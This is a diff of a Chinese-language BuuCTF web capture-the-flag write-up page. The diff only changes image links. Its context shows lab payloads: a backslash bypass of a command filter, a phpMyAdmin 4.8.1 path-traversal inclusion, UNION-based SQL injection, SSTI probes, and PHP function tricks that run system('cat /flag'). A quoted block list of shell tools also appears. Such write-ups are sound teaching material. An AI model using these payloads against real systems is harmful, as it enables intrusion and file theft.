@@ -368,14 +368,14 @@ if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed
 <p>利用反斜杠就可以轻松绕过对linux命令的过滤，因为<code>\</code>在linux中还可以作为换行之意(未必真要换行)，此时不影响代码执行</p>
 <p><code>cmd=ca\t%20/flag </code>；</p>
 <p><strong>操作细节</strong></p>
-<p>![截屏2020-08-03 下午9.45.45](BuuCTF-Web-writeup-第三部分/截屏2020-08-03 下午9.45.45.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-03%20%E4%B8%8B%E5%8D%889.45.45.png" alt="截屏2020-08-03 下午9.45.45"></p>
 <p>如果在burpsuite中如上传值无法成功可以尝试右键选择<code>Change body encoding</code>之后再传值</p>
 <h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p><strong>解题方法</strong></p>
 <p>扫描后发现存在<code>/phpmyadmin/</code>，访问后得知<code>版本信息 4.8.1</code></p>
 <p>phpmyadmin 4.8.1存在文件包含漏洞，构造<code>?target=db_datadict.php%253f/../../../../../../../../../flag</code></p>
 <h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p><strong>解题方法</strong></p>
 <p>扫描目标后发现.git源码泄露，并使用<code>Githack</code>还原源码</p>
-<p>![截屏2020-08-03 下午9.51.30](BuuCTF-Web-writeup-第三部分/截屏2020-08-03 下午9.51.30.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-03%20%E4%B8%8B%E5%8D%889.51.30.png" alt="截屏2020-08-03 下午9.51.30"></p>
 <p><strong>代码审计</strong></p>
 <pre><code class="php">&lt;?php
 
@@ -427,7 +427,7 @@ echo &quot;the flag is: &quot;.$flag;</code></pre>
 </li>
 </ul>
 <h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p><strong>解题思路</strong></p>
-<p>![截屏2020-08-04 上午9.42.23](BuuCTF-Web-writeup-第三部分/截屏2020-08-04 上午9.42.23.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-04%20%E4%B8%8A%E5%8D%889.42.23.png" alt="截屏2020-08-04 上午9.42.23"></p>
 <p>多次测试后得出结论: </p>
 <ol>
 <li>只能输入一个字符</li>
@@ -435,9 +435,9 @@ echo &quot;the flag is: &quot;.$flag;</code></pre>
 </ol>
 <p><strong>解题方法</strong></p>
 <p>通过<a href="https://www.compart.com/en/unicode" target="_blank" rel="noopener">Unicode-Compart</a>查询Unicode字符值大于1337的字符；比如搜索<code>ten thousand</code>，从结果中任选一个字符</p>
-<p>![截屏2020-08-04 上午9.49.14](BuuCTF-Web-writeup-第三部分/截屏2020-08-04 上午9.49.14.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-04%20%E4%B8%8A%E5%8D%889.49.14.png" alt="截屏2020-08-04 上午9.49.14"></p>
 <p>复制到搜索框即可</p>
-<p>![截屏2020-08-04 上午9.50.35](BuuCTF-Web-writeup-第三部分/截屏2020-08-04 上午9.50.35.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-04%20%E4%B8%8A%E5%8D%889.50.35.png" alt="截屏2020-08-04 上午9.50.35"></p>
 <h2 id="简单了解Unicode"><a href="#简单了解Unicode" class="headerlink" title="简单了解Unicode"></a>简单了解Unicode</h2><blockquote>
 <p><strong>Unicode实际上是一个字符和数字之间的映射关系表</strong>，并不制定实际的编码方案。因此又开始制定UTF标准，包括UTF-8、UTF-16和UTF-32等。可以理解为Unicode是一个设计图，而UTF-X是其中一种实现</p>
 </blockquote>
@@ -456,9 +456,9 @@ echo &quot;the flag is: &quot;.$flag;</code></pre>
 <p><strong>解题方法</strong></p>
 <p>首先先猜字段数，一直到<code>title=&#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22&amp;content=hello&amp;ac=add</code></p>
 <p>时界面回显如下，可以判断此表有22列，<code>2, 3</code>为显示位</p>
-<p>![截屏2020-08-04 下午2.22.26](BuuCTF-Web-writeup-第三部分/截屏2020-08-04 下午2.22.26.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-04%20%E4%B8%8B%E5%8D%882.22.26.png" alt="截屏2020-08-04 下午2.22.26"></p>
 <p>由于BuuCTF此题环境没有<code>sys.schema_table_statistics_with_buffer</code>，所以只能硬猜表名，猜测其为<code>users</code>，三个字段(一个非常常见的表)</p>
-<p>![截屏2020-08-04 下午2.30.14](BuuCTF-Web-writeup-第三部分/截屏2020-08-04 下午2.30.14.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-04%20%E4%B8%8B%E5%8D%882.30.14.png" alt="截屏2020-08-04 下午2.30.14"></p>
 <p>用联合查询进行无列名注入后得到flag</p>
 <p><code>title=&#39;union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)as/**/x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#39;22&amp;content=hello&amp;ac=add</code></p>
 <h2 id="bypass-information-schema"><a href="#bypass-information-schema" class="headerlink" title="bypass information_schema"></a>bypass information_schema</h2><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><blockquote>
@@ -545,7 +545,7 @@ mysql&gt; select b from (select 1,2 as b,3 union select * from user) as c;
 <li>插入恶意数据，此时会用<code>mysql_escape_string</code>函数对恶意字符进行转义，从而不会引发注入异常</li>
 <li>引用插入的恶意数据，在进行查询时，数据库对自身数据过分信任，直接从中引用恶意数据，没有做进一步过滤和检验</li>
 </ol>
-<p>![截屏2020-08-04 下午1.52.55](BuuCTF-Web-writeup-第三部分/截屏2020-08-04 下午1.52.55.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-04%20%E4%B8%8B%E5%8D%881.52.55.png" alt="截屏2020-08-04 下午1.52.55"></p>
 <h1 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h1><p><strong>解题方法</strong></p>
 <p>尝试<code>username=admin&amp;passwd=123</code>登录会回显<code>alert(&#39;别骗我，你才不是admin呢&#39;)</code>；</p>
 <p>随意切换用户名，比如使用<code>username=tom&amp;passwd=123</code>登录并抓包会发现302重定向</p>
@@ -562,7 +562,7 @@ mysql&gt; select b from (select 1,2 as b,3 union select * from user) as c;
 <p>可以看到提示<code>Sorry, this site is only optimized for browsers that run on Commodo 64</code></p>
 <p>将<code>User-Agent</code>直接换成<code>Commodo 64</code>会提示<code>o no no i think it is not the real commmodo 64, &lt;br&gt;what is the real ua for Commdo?</code></p>
 <p>上网搜索<code>Commodo 64</code>会看到Wiki显示如下，因此更换成如下值</p>
-<p>![截屏2020-08-04 上午10.16.04](BuuCTF-Web-writeup-第三部分/截屏2020-08-04 上午10.16.04.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-04%20%E4%B8%8A%E5%8D%8810.16.04.png" alt="截屏2020-08-04 上午10.16.04"></p>
 <p>此时显示<code>Sorry, this site is only optimized for those whose email is root@gem-love.com</code></p>
 <p>设置<code>From: root@gem-love.com</code>后可以看到<code>Sorry, this site is only optimized for those who use the http proxy of y1ng.vip&lt;br&gt; if you dont have the proxy, pls contact us to buy, ￥100/Month</code></p>
 <p>设置<code>Via: y1ng.vip</code>得到结果后解码就得到flag</p>
@@ -572,7 +572,7 @@ mysql&gt; select b from (select 1,2 as b,3 union select * from user) as c;
 <pre><code class="html">&lt;!-- Do you know why i know your ip? --&gt;</code></pre>
 <p><strong>解题方法</strong></p>
 <p>设置<code>X-Forwarded-For: 127.0.0.1</code>发现ip发生变化，证明ip可控；加上变量包裹符测试依据回显判断存在ssti模板注入</p>
-<p>![截屏2020-08-04 上午10.28.37](BuuCTF-Web-writeup-第三部分/截屏2020-08-04 上午10.28.37.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-04%20%E4%B8%8A%E5%8D%8810.28.37.png" alt="截屏2020-08-04 上午10.28.37"></p>
 <p>可以先查看一下<code>flag.php</code>的代码，看看这道题的逻辑</p>
 <p><strong>代码审计</strong></p>
 <pre><code class="php">&lt;?php
@@ -655,7 +655,7 @@ if(!isset($_GET[&#39;c&#39;])){
 <li><strong>dechex</strong></li>
 </ul>
 <p><strong>解题方法1</strong></p>
-<p>![截屏2020-08-05 上午10.41.22](BuuCTF-Web-writeup-第三部分/截屏2020-08-05 上午10.41.22.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-05%20%E4%B8%8A%E5%8D%8810.41.22.png" alt="截屏2020-08-05 上午10.41.22"></p>
 <p>通过对结果进行逆推来构造payload如下</p>
 <p><code>?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$pi){1})&amp;0=system&amp;1=cat /flag</code></p>
 <p>对payload进行解读</p>
@@ -678,7 +678,7 @@ if(!isset($_GET[&#39;c&#39;])){
 <pre><code class="php">&gt; $pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})
 &gt; base_convert(696468,10,36)(base_convert(8768397090111664438,10,30)(){1})
 &gt; exec(getallheaders(){1})</code></pre>
-<p>![截屏2020-08-05 上午11.08.57](BuuCTF-Web-writeup-第三部分/截屏2020-08-05 上午11.08.57.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-05%20%E4%B8%8A%E5%8D%8811.08.57.png" alt="截屏2020-08-05 上午11.08.57"></p>
 <p><strong>解题方法3</strong></p>
 <p>之前提到函数名实际上就是字符串，因此可以编写脚本令函数名与00 - 99的数字进行异或从而产生其他可以利用的字符串</p>
 <pre><code class="php">&lt;?php
@@ -699,7 +699,7 @@ for($k=1;$k&lt;=sizeof($payload);$k++){
 <h3 id="a-zA-Z-x7f-xff-a-zA-Z-0-9-x7f-xff"><a href="#a-zA-Z-x7f-xff-a-zA-Z-0-9-x7f-xff" class="headerlink" title="/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/"></a>/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/</h3><p>这句正则表达式的含义实际上就是php变量名的命名规则；一个有效的变量名由字母或者下划线开头，后面跟上任意数量的字母，数字或者下划线</p>
 <p><code>\x7f-\xff</code>指的是ASCII码127到255的不可见字符；只有满足php变量名的命名规则才能存储到数组中</p>
 <p>打印之前<strong>解题方法1</strong>中的<code>$match[0]</code>，方便理解</p>
-<p>![截屏2020-08-05 上午11.30.34](BuuCTF-Web-writeup-第三部分/截屏2020-08-05 上午11.30.34.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-05%20%E4%B8%8A%E5%8D%8811.30.34.png" alt="截屏2020-08-05 上午11.30.34"></p>
 <h2 id="php函数特点"><a href="#php函数特点" class="headerlink" title="php函数特点"></a>php函数特点</h2><ul>
 <li>php的函数名均可以视为字符串，可进行与字符串相同的操作</li>
 <li>php从5.4之后可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数</li>
@@ -716,12 +716,12 @@ for($k=1;$k&lt;=sizeof($payload);$k++){
 <pre><code class="html">&lt;!-- Why not take a closer look at cookies? --&gt;</code></pre>
 <p><strong>解题方法</strong></p>
 <p>在<code>Flag</code>的id处随意输入后提交；界面回显如下</p>
-<p>![截屏2020-08-05 上午11.47.44](BuuCTF-Web-writeup-第三部分/截屏2020-08-05 上午11.47.44.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-05%20%E4%B8%8A%E5%8D%8811.47.44.png" alt="截屏2020-08-05 上午11.47.44"></p>
 <p>进行抓包，发现<code>Cookie: user=tom</code>；猜测系统可能直接获取Cookie中user的值后进行模板拼接就输出到界面中，因而存在ssti模板注入</p>
 <p>利用<code>2*2</code>进行测试发现回显<code>4</code>证明确实存在模板注入</p>
 <p><strong>模板确认</strong></p>
 <p>搬运一个之前被人总结好的一个流程图</p>
-<p>![截屏2020-08-05 下午12.02.29](BuuCTF-Web-writeup-第三部分/截屏2020-08-05 下午12.02.29.png)</p>
+<p><img src="BuuCTF-Web-writeup-%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86/%E6%88%AA%E5%B1%8F2020-08-05%20%E4%B8%8B%E5%8D%8812.02.29.png" alt="截屏2020-08-05 下午12.02.29"></p>
 <pre><code>{{7*'7'}} -&gt; 7777777 [Jinja2]
 {{7*'7'}} -&gt; 49      [Twig]</code></pre>
 <p>测试后回显为<code>Twig</code>，使用<code>Twig</code>对于的payload就可以得到flag</p>
